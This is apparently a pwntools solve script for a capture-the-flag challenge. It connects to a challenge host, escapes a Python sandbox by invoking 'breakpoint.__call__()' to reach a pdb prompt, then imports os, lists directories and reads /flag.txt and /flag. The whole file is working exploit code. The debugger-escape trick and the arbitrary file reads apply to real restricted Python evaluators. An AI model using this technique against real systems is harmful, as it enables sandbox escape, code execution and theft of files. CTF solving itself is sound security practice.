from pwn import *

HOST = "daf652130c66c828.chal.ctf.ae"
io = remote(host=HOST, port=443, ssl=True, sni=HOST)
io.sendlineafter("code > ", "breakpoint.__call__()")

# Wait for initial pdb output
io.recvuntil("->None\n")

# Import os
io.sendline("!import os")
io.recvuntil("(Pdb) ")

# List current directory
io.sendline("!print(os.listdir('.'))")
dir_output = io.recvuntil("(Pdb) ")
print("Current directory:\n", dir_output.decode())

# List root directory
io.sendline("!print(os.listdir('/'))")
root_output = io.recvuntil("(Pdb) ")
print("Root directory:\n", root_output.decode())

# Try to read /flag.txt
io.sendline("!print(open('/flag.txt').read())")
flag_txt_output = io.recvuntil("(Pdb) ")
print("Content of /flag.txt:\n", flag_txt_output.decode())

# Try to read /flag
io.sendline("!print(open('/flag').read())")
flag_output = io.recvuntil("(Pdb) ")
print("Content of /flag:\n", flag_output.decode())

# Quit pdb
io.sendline("q")

io.close()